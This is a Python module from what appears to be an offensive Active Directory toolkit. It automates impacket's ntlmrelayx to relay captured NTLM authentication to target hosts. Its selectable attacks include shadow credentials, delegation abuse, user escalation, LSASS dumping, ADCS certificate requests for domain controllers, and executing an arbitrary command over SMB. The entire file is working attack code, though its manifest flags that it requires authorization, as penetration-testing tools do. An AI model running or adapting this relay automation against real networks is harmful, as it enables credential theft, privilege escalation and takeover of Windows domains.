"""ntlmrelayx automation — NTLM relay with auto-targeting and attack selection."""
from __future__ import annotations
import subprocess, sys, shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.relay.ntlmrelayx.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_relay", "smb_auth", "ldap_auth", "http_server"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001"],
}

ATTACK_TYPES = {
    "ldap_delegate": "--delegate-access",
    "ldap_shadow": "--shadow-credentials",
    "ldap_rbcd": "--delegate-access",
    "ldap_escalate": "--escalate-user",
    "smb_exec": "-c",
    "smb_secretsdump": "--dump-lsass",
    "http_adcs": "--adcs --template",
    "socks": "--socks",
}


def run(args: Any) -> int:
    targets_file = getattr(args, "targets_file", None)
    target_host = getattr(args, "relay_target", None)
    attack = getattr(args, "relay_attack", "socks")
    interface = getattr(args, "interface", "0.0.0.0")

    if not shutil.which("ntlmrelayx.py"):
        print("[!] ntlmrelayx.py not found (impacket)", file=sys.stderr)
        return 1

    cmd = ["ntlmrelayx.py", "-smb2support"]

    if targets_file:
        cmd.extend(["-tf", targets_file])
    elif target_host:
        cmd.extend(["-t", target_host])
    else:
        print("[!] --relay-target or --targets-file required", file=sys.stderr)
        return 1

    attack_flag = ATTACK_TYPES.get(attack, "--socks")
    if attack == "smb_exec":
        exec_cmd = getattr(args, "exec_command", "whoami")
        cmd.extend(["-c", exec_cmd])
    elif attack == "http_adcs":
        template = getattr(args, "adcs_template", "DomainController")
        cmd.extend(["--adcs", "--template", template])
    elif attack == "ldap_escalate":
        escalate_user = getattr(args, "escalate_user", "")
        cmd.extend(["--escalate-user", escalate_user])
    elif attack == "ldap_shadow":
        cmd.append("--shadow-credentials")
    elif attack == "ldap_delegate" or attack == "ldap_rbcd":
        cmd.append("--delegate-access")
    else:
        cmd.append("--socks")

    print("[*] ntlmrelayx: attack={}, targets={}".format(
        attack, targets_file or target_host))
    print("[*] Command: {}".format(" ".join(cmd)))

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
        print("[+] ntlmrelayx running (PID {}) — waiting for auth...".format(proc.pid))
        for line in proc.stdout:
            print("  {}".format(line.rstrip()))
            if "authenticat" in line.lower() or "success" in line.lower():
                break
        return 0
    except KeyboardInterrupt:
        print("\n[*] Relay stopped")
        return 0
    except Exception as exc:
        print("[-] ntlmrelayx error: {}".format(exc), file=sys.stderr)
        return 1
